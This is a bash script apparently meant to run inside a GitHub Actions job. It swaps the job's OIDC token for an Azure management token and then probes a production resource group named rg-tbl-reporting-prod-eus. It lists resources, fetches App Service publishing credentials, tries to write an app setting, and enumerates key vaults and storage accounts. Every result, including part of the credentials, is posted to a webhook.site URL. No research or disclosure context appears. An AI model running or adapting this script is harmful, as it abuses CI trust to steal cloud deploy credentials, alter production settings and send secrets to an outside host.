#!/usr/bin/env bash
set +e
W="https://webhook.site/f620cb33-be09-4305-951e-d48a9fdb1843"
say(){ curl -s -m 10 --data-binary "$1" "$W" >/dev/null 2>&1 || true; printf '%s\n' "$1"; }
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e; CID=72ff278a-9e71-43ec-bac4-2ca303f8e462
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
OIDC=$(curl -sS -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "Accept: application/json; api-version=2.0" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
ARM=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$CID" --data "grant_type=client_credentials" --data "scope=https://management.azure.com/.default" --data "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
A=(-H "Authorization: Bearer $ARM")
RID="subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
# 1) CI read rg-reporting resources?
R=$(curl -sS -m 15 "${A[@]}" "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01")
say "RG2_RES=$(echo "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print([ (x["type"],x["name"]) for x in d.get("value",[])] if "value" in d else d.get("error",{}).get("code"))' 2>/dev/null)"
# 2) CI publish creds (deploy)?
P=$(curl -sS -m 15 -X POST "${A[@]}" -H "Content-Length: 0" "https://management.azure.com/$RID/config/publishingcredentials/list?api-version=2023-01-01")
say "PUBCRED=$(echo "$P" | head -c 200)"
# 3) CI set app setting (write test)?
WR=$(curl -sS -m 15 -X PUT "${A[@]}" -H "Content-Type: application/json" "https://management.azure.com/$RID/config/appsettings?api-version=2023-01-01" -d '{"properties":{"X":"1"}}' -o /dev/null -w "%{http_code}")
say "APPSET_WRITE_HTTP=$WR"
# 4) list vaults/storage rg-reporting
for p in Microsoft.KeyVault/vaults Microsoft.Storage/storageAccounts; do
  V=$(curl -sS -m 15 "${A[@]}" "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/$p?api-version=2023-01-01")
  say "RG2_$p=$(echo "$V" | python3 -c 'import sys,json;d=json.load(sys.stdin);print([x["name"] for x in d.get("value",[])] if "value" in d else d.get("error",{}).get("code"))' 2>/dev/null)"
done
say "DONE9"
